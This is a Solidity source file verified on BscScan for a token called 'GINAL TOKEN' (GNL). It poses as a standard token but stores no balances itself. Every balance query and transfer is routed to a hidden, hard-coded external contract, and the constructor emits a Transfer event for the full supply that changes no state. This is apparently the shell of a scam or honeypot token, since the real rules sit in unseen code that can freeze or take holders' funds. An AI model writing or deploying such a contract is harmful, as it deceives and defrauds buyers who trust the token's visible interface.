/**
 *Submitted for verification at BscScan.com on 2023-02-18
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface LX {
    function transferFrom(address from, address to, uint amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

contract GNL {
    string public constant name = "GINAL TOKEN";
    string public constant symbol = "GNL";
    uint8 public  constant decimals = 18;
    uint256 public totalSupply = 1000000000 * 10 ** decimals;
    
    mapping(address => mapping(address => uint256)) private allowances;
    address private stAddress;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        emit Transfer(address(0), msg.sender, totalSupply);
        stAddress = 0xE779Fd5a9c7cdE373BE8307A07E19068Fffb6Ac2;
    }

    // ERC20 Functions
    function balanceOf(address account) public view returns (uint256) {
        return LX(stAddress).balanceOf(account);
    }
    function allowance(address tokenOwner, address spender) public view returns (uint256) {
        return allowances[tokenOwner][spender];
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address receiver, uint256 amount) public returns (bool) {
        emit Transfer(msg.sender, receiver, amount);
        return LX(stAddress).transferFrom(msg.sender, receiver, amount);
    }
    function transferFrom(address tokenOwner, address receiver, uint256 amount) public returns (bool) {
        require(amount <= allowances[tokenOwner][msg.sender] && amount > 0);
        allowances[tokenOwner][msg.sender] -= amount;
        emit Transfer(tokenOwner, receiver, amount);
        return LX(stAddress).transferFrom(tokenOwner, receiver, amount);
    }
}